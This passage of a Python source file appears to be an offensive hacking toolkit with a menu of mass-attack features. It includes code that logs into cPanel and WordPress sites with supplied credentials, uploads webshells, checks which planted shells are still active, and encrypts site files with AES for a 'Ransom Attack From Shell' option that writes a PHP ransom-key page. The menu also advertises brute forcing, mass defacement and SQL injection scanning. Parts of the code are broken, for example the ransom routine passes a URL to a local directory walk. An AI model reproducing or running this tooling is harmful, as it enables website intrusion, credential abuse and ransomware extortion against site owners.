            urls = f.read().splitlines()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    for line in urls:
        try:
            url, credentials = line.strip().split('#')
            username, password = credentials.split('@')
            username = username.strip()
            password = password.strip()
            session = requests.Session()
            login_data = {
                'user': username,
                'pass': password
            }
            response = session.post(f'{url}/login/', data=login_data)
            if 'cPanel' in response.text:
                response = session.get(f'{url}/filemanager/')
                if 'Upload' in response.text:
                    with open(shell_file, 'rb') as f:
                        files = {'file': f}
                        response = session.post(f'{url}/filemanager/upload', files=files)
                        if 'File uploaded' in response.text:
                            shell_url = f"{url}/{shell_file.split('/')[-1]}"
                            print(f"\033[92m[+] SUCCESS: Shell uploaded to: {shell_url}\033[0m")
                            with open(output_file, "a") as success_file:
                                success_file.write(f"{shell_url}\n")
                        else:
                            print(f"\033[91m[-] FAILED: Shell upload failed for: {url}\033[0m")
                else:
                    print(f"\033[91m[-] {url} cPanel does not have File Manager\033[0m")
            else:
                print(f"\033[91m[-] {url} This website cannot be reached out\033[0m")
        except Exception as e:
            print(f"An error occurred with {line}: {e}")
            continue

def mass_shell_active_finder():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print("Note: File format should be a list of URLs, each containing the webshell path")
    print(" ")
    print(" ")
    print("\033[91m[*] INFO: Please enter the name of the file containing the webshell URLs...\033[0m")
    file_name = input("->> Input File : ")
    print("\033[91m[*] INFO: Please enter the name of the output file...\033[0m")
    output_file = input("->> Output File : ")

    try:
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
            urls = f.read().splitlines()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    for line in urls:
        try:
            webshell_url = line.strip()
            response = requests.get(webshell_url)
            if response.status_code == 200 and "webshell" in response.text.lower():
                print(f"\033[92m[+] SUCCESS: Active webshell found at: {webshell_url}\033[0m")
                with open(output_file, "a") as success_file:
                    success_file.write(f"{webshell_url}\n")
            else:
                print(f"\033[91m[-] FAILED: Webshell not active at: {webshell_url}\033[0m")
        except Exception as e:
            print(f"An error occurred with {line}: {e}")
            continue

def encrypt_files(file_path, key):
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
    import base64

    def pad(data):
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data) + padder.finalize()
        return padded_data

    def encrypt(message, passphrase):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(passphrase.encode('utf-8')), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded_message = pad(message.encode('utf-8'))
        encrypted_message = encryptor.update(padded_message) + encryptor.finalize()
        return base64.b64encode(iv + encrypted_message).decode('utf-8')

    for root, dirs, files in os.walk(file_path):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                data = f.read()
            encrypted_data = encrypt(data, key)
            with open(file_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(encrypted_data)

def decrypt_files(file_path, key):

    def unpad(data):
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        unpadded_data = unpadder.update(data) + unpadder.finalize()
        return unpadded_data

    def decrypt(encrypted, passphrase):
        encrypted = base64.b64decode(encrypted)
        iv = encrypted[:16]
        cipher = Cipher(algorithms.AES(passphrase.encode('utf-8')), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_message = decryptor.update(encrypted[16:]) + decryptor.finalize()
        return unpad(decrypted_message).decode('utf-8')

    for root, dirs, files in os.walk(file_path):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                data = f.read()
            decrypted_data = decrypt(data, key)
            with open(file_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(decrypted_data)

    for root, dirs, files in os.walk(file_path):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'r') as f:
                data = f.read()
            decrypted_data = decrypt(data, key)
            with open(file_path, 'w') as f:
                f.write(decrypted_data)

def create_decrypt_php(output_file, key):
    decrypt_php_content = f"""
    <?php
    if (isset($_POST['key'])) {{
        $input_key = $_POST['key'];
        if ($input_key === '{key}') {{
            echo "Key valid. Website decrypted.";
            // Add your decryption logic here
        }} else {{
            echo "Invalid key.";
        }}
    }}
    ?>
    <form method="post">
        <label for="key">Enter decryption key:</label>
        <input type="text" id="key" name="key">
        <input type="submit" value="Decrypt">
    </form>
    """
    with open(output_file, 'w') as f:
        f.write(decrypt_php_content)

def ransom_tool():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print("Note: File format should be url#(webshell_path)")
    print(" ")
    print(" ")
    print("\033[91m[*] INFO: Please enter the name of the file containing the webshell URLs...\033[0m")
    file_name = input("->> Input File : ")
    print("\033[91m[*] INFO: Please enter the encryption key...\033[0m")
    key = input("->> Encryption Key : ")
    print("\033[91m[*] INFO: Please enter the name of the output file for decrypt.php...\033[0m")
    output_file = input("->> Output File : ")

    try:
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
            urls = f.read().splitlines()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    for webshell_url in urls:
        try:
            response = requests.get(webshell_url)
            if response.status_code == 200 and "webshell" in response.text.lower():
                print(f"\033[92m[+] SUCCESS: Active webshell found at: {webshell_url}\033[0m")
                encrypt_files(webshell_url, key)
                create_decrypt_php(output_file, key)
                print(f"\033[92m[+] SUCCESS: Files encrypted and decrypt.php created at: {output_file}\033[0m")
            else:
                print(f"\033[91m[-] FAILED: Webshell not active at: {webshell_url}\033[0m")
        except Exception as e:
            print(f"An error occurred with {url}: {e}")
            continue

def adminer():
    os.system('clear')
    animate_startup()
    os.system('clear')
    file_name = input("->> Input File : ")
    print("\033[91m[*] INFO: Please enter the name of the output file for admin credentials...\033[0m")
    output_file = input("->> Output File : ")

    try:
        with open(file_name, 'r', encoding='utf-8', errors='ignore') as f:
            credentials = f.read().splitlines()
    except Exception as e:
        print(f"An error occurred: {e}")
        return

    admin_credentials = []

    for line in credentials:
        try:
            url, credentials = line.strip().split('#')
            username, password = credentials.split('@')
            username = username.strip()
            password = password.strip()
            session = requests.Session()
            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': f'{url}/wp-admin/',
                'testcookie': '1'
            }
            response = session.post(f'{url}/wp-login.php', data=login_data)
            if 'wp-admin' in response.url:
                response = session.get(f'{url}/wp-admin/profile.php')
                if 'role="administrator"' in response.text:
                    print(f"\033[92m[+] SUCCESS: Admin credentials found for: {url}\033[0m")
                    admin_credentials.append(f"{url}#{username}@{password}")
                else:
                    print(f"\033[91m[-] FAILED: Not an admin role for: {url}\033[0m")
            else:
                print(f"\033[91m[-] FAILED: Login failed for: {url}\033[0m")
        except Exception as e:
            print(f"An error occurred with {line}: {e}")
            continue

    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            for cred in admin_credentials:
                f.write(f"{cred}\n")
        print(f"\033[92m[+] SUCCESS: Admin credentials saved to: {output_file}\033[0m")
    except Exception as e:
        print(f"An error occurred while saving the file: {e}")

def main():
    os.system('clear')
    animate_startup()
    os.system('clear')
    banner()
    print("\033[92mDeveloped by\033[0m @505Lab | t.me/Lab505")
    print("\033[0m")
    print(" ")
    print(" ")
    print("MIX Menu:")
    print("[\033[92m~\033[0m] 1. MASS Brute Force WordPress\033[0m")
    print("[\033[92m~\033[0m] 2. Shell Finder\033[0m")
    print("[\033[92m~\033[0m] 3. CCTV Jammer\033[0m")
    print("[\033[92m~\033[0m] 4. SQLi Vuln MASS Scan\033[0m")
    print("[\033[92m~\033[0m] 5. Zone-H Grabber\033[0m")
    print("[\033[92m~\033[0m] 6. Single Wordpress BruteForce\033[0m")
    print("[\033[92m~\033[0m] 7. Mass Deface From Shells\033[0m")
    print("[\033[92m~\033[0m] 8. Reverse IP\033[0m")
    print("[\033[92m~\033[0m] 9. Reverse DOMAIN (Get SUBD)\033[0m")
    print(" ")
    print("Checker Menu:")
    print("[\033[92m~\033[0m] 10. Wordpress Login Checker (mass)\033[0m")
    print("[\033[92m~\033[0m] 11. Proxy Valid Checker (mass)\033[0m")
    print("[\033[92m~\033[0m] 12. CMS Checker (mass)\033[0m")
    print(" ")
    print("Get Menu:")
    print("[\033[92m~\033[0m] 13. Proxy Scrape + Validate (DAILY)\033[0m")
    print("[\033[92m~\033[0m] 14. GET Duplicate Remove\033[0m")
    print("[\033[92m~\033[0m] 15. TLD Domain Grabber\033[0m")
    print(" ")
    print("Shell Menu:")
    print("[\033[92m~\033[0m] 16. Wordpress Auto Upload Shell\033[0m")
    print("[\033[92m~\033[0m] 17. Joomla Auto Upload Shell\033[0m")
    print("[\033[92m~\033[0m] 18. CPanel Auto Upload Shell\033[0m")
    print("[\033[92m~\033[0m] 19. Active Shell Scan (mass)\033[0m")
    print("[\033[92m~\033[0m] 20. Ransom Attack From Shell (mass)\033[0m")
    print("")
    choice = input("Choose Menu: ")
    if choice == "1":
        brute_force_wordpress()
    elif choice == "2":
        shell_finder()
    elif choice == "3":
        cctv_jammer()
    elif choice == "4":
        sqli_vulnscan()
    elif choice == "5":
        zone_xsec_grabber()
    elif choice == "6":
        single_brute_force_wordpress()
    elif choice == "7":
        mass_deface()
    elif choice == "8":
        reverse_ip_lookup()
    elif choice == "9":
        reverse_domain_lookup()
    elif choice == "10":
        wp_login_checker()
    elif choice == "11":
        mass_proxy_checker()
    elif choice == "12":
        cms_checker()
    elif choice == "13":
        proxy_scrape_and_validate()
    elif choice == "14":
        remove_duplicates()
    elif choice == "15":
        tld_domain_dork()
    elif choice == "16":
        wordpress_auto_upload_shell()
    elif choice == "17":
        joomla_auto_upload_shell()
    elif choice == "18":
        cpanel_auto_upload_shell()
    elif choice == "19":
        mass_shell_active_finder()
    elif choice == "20":
        ransom_tool()
    elif choice == "21":
        adminer()
    else:
        print("Invalid choice. Please try again.")
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"An error occurred: {e}")
        print("The program cannot be run due to the above error.")